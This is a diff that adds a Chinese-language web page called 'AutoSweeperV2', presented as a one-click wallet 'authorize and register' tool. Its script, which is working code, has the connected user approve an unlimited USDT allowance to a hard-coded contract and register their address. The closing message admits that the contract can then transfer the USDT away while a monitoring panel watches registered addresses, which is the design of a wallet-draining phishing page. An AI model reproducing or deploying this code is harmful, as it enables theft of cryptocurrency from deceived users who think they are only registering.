@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>一键授权并注册 - AutoSweeperV2</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <style>
+        body { background: #0a0c15; color: white; font-family: monospace; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; }
+        button { padding: 12px; margin: 10px 0; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .btn-connect { background: #3b82f6; color: white; border: none; }
+        .btn-action { background: #10b981; color: white; border: none; }
+        .card { background: #1e293b; padding: 24px; border-radius: 16px; margin-top: 20px; }
+        .status-area { margin-top: 15px; padding: 12px; background: #0f172a; border-radius: 12px; }
+        .step { margin: 6px 0; font-size: 14px; }
+        .step-completed { color: #10b981; }
+        .step-pending { color: #facc15; }
+        .step-failed { color: #ef4444; }
+        hr { border-color: #334155; }
+        .info { color: #facc15; font-size: 12px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <h2 style="text-align:center;">🔐 一键授权 + 自动注册</h2>
+        <p class="info" style="text-align:center;">连接钱包 → 点击按钮 → 自动完成授权+注册</p>
+        
+        <button id="connectBtn" class="btn-connect" onclick="connect()">1️⃣ 连接钱包</button>
+        <button id="actionBtn" class="btn-action" onclick="approveAndRegister()">🚀 一键授权并注册</button>
+        
+        <div id="status" class="status-area">
+            <div class="step-pending" id="step1">⚪ 步骤1: 等待连接钱包</div>
+            <div class="step-pending" id="step2">⚪ 步骤2: 等待连接钱包</div>
+        </div>
+        <hr>
+        <div class="info" style="font-size: 12px;">
+            📌 合约地址已固定: 0x40689fc22fB83d1Ea93E8cEf9eD5aBbA0399AEFF<br>
+            📌 点击一次自动完成：授权USDT → 注册地址到合约<br>
+            ✅ 完成后，监控面板会自动读取您的地址
+        </div>
+    </div>
+</div>
+
+<script>
+    const CONTRACT_ADDRESS = "0x40689fc22fB83d1Ea93E8cEf9eD5aBbA0399AEFF";
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    const USDT_ABI = ["function approve(address spender, uint256 amount) returns (bool)", "function allowance(address owner, address spender) view returns (uint256)"];
+    const CONTRACT_ABI = ["function registerSelf() external"];
+    
+    let signer;
+    let userAddress;
+    let isProcessing = false;
+    
+    function updateStep(step, status, message) {
+        const stepElement = document.getElementById(step);
+        if (status === 'completed') {
+            stepElement.innerHTML = `✅ ${message}`;
+            stepElement.className = 'step-completed';
+        } else if (status === 'pending') {
+            stepElement.innerHTML = `⏳ ${message}`;
+            stepElement.className = 'step-pending';
+        } else if (status === 'failed') {
+            stepElement.innerHTML = `❌ ${message}`;
+            stepElement.className = 'step-failed';
+        } else {
+            stepElement.innerHTML = `⚪ ${message}`;
+            stepElement.className = 'step-pending';
+        }
+    }
+    
+    async function connect() {
+        const connectBtn = document.getElementById("connectBtn");
+        
+        if (!window.ethereum) {
+            updateStep('step1', 'failed', '请安装 TokenPocket 或 MetaMask');
+            return;
+        }
+        
+        try {
+            connectBtn.disabled = true;
+            connectBtn.innerText = "⏳ 连接中...";
+            updateStep('step1', 'pending', '正在连接钱包...');
+            
+            const provider = new ethers.BrowserProvider(window.ethereum);
+            signer = await provider.getSigner();
+            userAddress = await signer.getAddress();
+            
+            updateStep('step1', 'completed', `已连接: ${userAddress.slice(0,8)}...${userAddress.slice(-6)}`);
+            updateStep('step2', 'pending', '等待点击「一键授权并注册」');
+            
+        } catch(e) {
+            updateStep('step1', 'failed', `连接失败: ${e.message.slice(0,80)}`);
+        } finally {
+            connectBtn.disabled = false;
+            connectBtn.innerText = "1️⃣ 连接钱包";
+        }
+    }
+    
+    async function approveAndRegister() {
+        const actionBtn = document.getElementById("actionBtn");
+        
+        if (isProcessing) {
+            updateStep('step2', 'failed', '操作进行中，请勿重复点击');
+            return;
+        }
+        
+        if (!signer) {
+            updateStep('step2', 'failed', '请先点击「连接钱包」');
+            return;
+        }
+        
+        isProcessing = true;
+        actionBtn.disabled = true;
+        actionBtn.innerText = "⏳ 处理中...";
+        
+        try {
+            // 步骤1: 授权 USDT
+            updateStep('step2', 'pending', '步骤1/2: 授权 USDT...');
+            
+            const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
+            const currentAllowance = await usdt.allowance(userAddress, CONTRACT_ADDRESS);
+            
+            if (currentAllowance >= ethers.MaxUint256) {
+                updateStep('step2', 'completed', '步骤1/2: USDT已授权，跳过');
+            } else {
+                const approveTx = await usdt.approve(CONTRACT_ADDRESS, ethers.MaxUint256, { gasLimit: 80000 });
+                updateStep('step2', 'pending', `步骤1/2: 授权交易已发送，等待确认...`);
+                await approveTx.wait();
+                updateStep('step2', 'completed', '步骤1/2: USDT授权成功 ✅');
+            }
+            
+            await new Promise(r => setTimeout(r, 1000));
+            
+            // 步骤2: 注册地址
+            updateStep('step2', 'pending', '步骤2/2: 注册地址到合约...');
+            
+            const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+            const registerTx = await contract.registerSelf({ gasLimit: 100000 });
+            updateStep('step2', 'pending', `步骤2/2: 注册交易已发送，等待确认...`);
+            await registerTx.wait();
+            updateStep('step2', 'completed', '步骤2/2: 地址注册成功 ✅');
+            
+            updateStep('step2', 'completed', '✅ 全部完成！合约可以转走USDT，监控面板会自动读取您的地址');
+            
+        } catch(e) {
+            console.error(e);
+            let errorMsg = e.message.slice(0, 150);
+            if (errorMsg.includes("duplicate call")) {
+                errorMsg = "检测到重复交易，请稍后重试";
+            }
+            if (errorMsg.includes("already registered")) {
+                updateStep('step2', 'completed', '✅ 地址已注册过，无需重复操作');
+            } else {
+                updateStep('step2', 'failed', `失败: ${errorMsg}`);
+            }
+        } finally {
+            isProcessing = false;
+            actionBtn.disabled = false;
+            actionBtn.innerText = "🚀 一键授权并注册";
+        }
+    }
+</script>
+</body>
+</html>
